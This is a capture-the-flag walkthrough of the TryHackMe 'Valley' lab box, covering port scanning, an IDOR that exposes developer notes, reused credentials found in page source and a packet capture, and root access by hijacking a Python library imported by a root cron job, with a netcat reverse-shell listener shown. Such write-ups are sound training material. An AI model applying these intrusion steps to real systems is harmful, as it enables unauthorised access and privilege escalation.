# THM - Valley

#### Ip: 10.10.130.63
#### Name: Valley
#### Rating: Easy

----------------------------------------------------------------------

valley.png

```text
Can you find your way into the Valley?

Boot the box and find a way in to escalate all the way to root!
```

### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I will also use the `--min-rate 10000` flag to speed the scan up.

```text
┌──(ryan㉿kali)-[~/THM/Valley]
└─$ sudo nmap -p-  --min-rate 10000 10.10.130.63
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 15:10 CDT
Nmap scan report for 10.10.130.63
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
37370/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.25 seconds

```

Lets dig a bit deeper by scanning these ports with the `-sC` and `-sV` flags to use default scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/THM/Valley]
└─$ sudo nmap -sC -sV -T4 10.10.130.63 -p 22,80,37370
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 15:12 CDT
Nmap scan report for 10.10.130.63
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
|_  256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

Navigating to the site on port 80 we find an (extremely ugly) webpage. 

site.png

Clicking on one of the pictures we see that we are redirected to http://10.10.130.63/static/1

static_1.png

This is interesting, first thing I want to test for is an IDOR vulnerability, and see if I can manually change the `/1` id form, to something else and perhaps access other materials.

After playing around for a bit I found this page, which definitely seems like it wasn't intended to be accessed externally like this:

static_00.png

```text
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

Of extra intrest here is the `/dev1243224123123` directory. Lets check it out:

login.png

Before trying to brute force a login or trying to bypass authentication via SQL injection, I love to poke around in the source code for a bit. This is espcially true here, as I already know the developers may be a bit careless and leave comments laying around.

Nice! Just the type of thing you love to find:

login_creds.png

Looks like weve discovered a new directory to checkout, as well as some credentials.

`siemDev:california`

Checking out the new directory at `http://10.10.130.63/dev1243224123123/devNotes37370.txt`we find another note:

another_note.png

Based on knowing that FTP is running on port 37370, as well as the note mentioning password reuse, I'll try the credentials in FTP.

Nice! That worked!

```text
┌──(ryan㉿kali)-[~/THM/Valley]
└─$ ftp 10.10.130.63 -p 37370
Connected to 10.10.130.63.
220 (vsFTPd 3.0.3)
Name (10.10.130.63:ryan): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||27339|)
150 Here comes the directory listing.
dr-xr-xr-x    2 1001     1001         4096 Mar 06 14:06 .
dr-xr-xr-x    2 1001     1001         4096 Mar 06 14:06 ..
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
226 Directory send OK.
```

Looks like we have 3 pcap files here. Lets bring them all back locally for inspection using the `mget *` command.

Looking through these files using Wireshark, I initially wasn;t finding much of interest. But deep down in the siemHTTP2 file I found a `/POST` request, and discovered some credentials.

pcap.png

Knowing these developers are reusing their credentials, I tried them in SSH and was able to get on the box.

```text
┌──(ryan㉿kali)-[~/THM/Valley]
└─$ ssh valleyDev@10.10.130.63                       
The authenticity of host '10.10.130.63 (10.10.130.63)' can't be established.
ED25519 key fingerprint is SHA256:cssZyBk7QBpWU8cMEAJTKWPfN5T2yIZbqgKbnrNEols.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.130.63' (ED25519) to the list of known hosts.
valleyDev@10.10.130.63's password:  
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ whoami
valleyDev
valleyDev@valley:~$ hostname
valley
```
I can now grab the user.txt flag:

user_flag.png

### Privilege Escalation

in the `/home` directory there is an executable file called valleyAuthenticator. I'll use SCP to bring that file back locally for inspection:

```text
┌──(ryan㉿kali)-[~/THM/Valley]
└─$ scp -P 22 valleyDev@10.10.130.63:/home/valleyAuthenticator ~/THM/Valley 
valleyDev@10.10.130.63's password: 
valleyAuthenticator 
```

Once the file is on my machine I can use the `strings` command to inspect the file:

```text
┌──(ryan㉿kali)-[~/THM/Valley]
└─$ strings valleyAuthenticator 
<SNIP>
e6722920bab2326f8217e4
bf6b1b58ac
ddJ1cc76ee3
beb60709056cfbOW
elcome to Valley Inc. Authentica
[k0rHh
 is your usernad
Ol: /passwXd.
```

Cool, this appears to be a password hash. I can throw this into Crackstation and crack it:

crack.png

I can now ssh in as user valley:

```text
┌──(ryan㉿kali)-[~/THM/Valley]
└─$ ssh valley@10.10.130.63 
valley@10.10.130.63's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

valley@valley:~$ whoami && hostname
valley
valley
```

Looking at active conjobs on the machine I find something interesting:

crontab.png

Taking a look at the file:

```text
valley@valley:~$ cat  /photos/script/photosEncrypt.py
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)
```

Ok cool, looks like this file is running base64 as root. Lets insert a reverse shell into the base64.py file, and it will be executed with root permissions as it connects to our listener.

First lets update the base64 file with the following:

base64.png

And then we can set up a Netcat listener and simply wait for our reverse shell.

```text
┌──(ryan㉿kali)-[~/THM/Valley]
└─$ nc -lvnp 443                                                                                                           
listening on [any] 443 ...
connect to [10.6.61.45] from (UNKNOWN) [10.10.130.63] 60908
bash: cannot set terminal process group (1616): Inappropriate ioctl for device
bash: no job control in this shell
root@valley:~# whoami && hostname
whoami && hostname
root
valley
```

Cool, all that's left to do now is grab the final flag:

root_flag.png

Thanks for following along!

-Ryan

---------------------------------------------------------------------------------